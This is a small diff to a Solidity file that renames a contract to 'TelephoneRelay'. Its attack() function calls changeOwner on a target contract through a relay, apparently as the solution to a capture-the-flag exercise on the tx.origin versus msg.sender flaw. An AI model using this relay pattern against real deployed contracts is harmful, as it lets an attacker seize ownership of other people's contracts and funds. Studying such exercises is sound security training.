@@ -5,7 +5,7 @@ interface targetInterface {
     function changeOwner(address _owner) external;
 }
 
-contract Relay {
+contract TelephoneRelay {
     function attack(address targetAddress) public {
         targetInterface target = targetInterface(targetAddress);
         target.changeOwner(address(this));
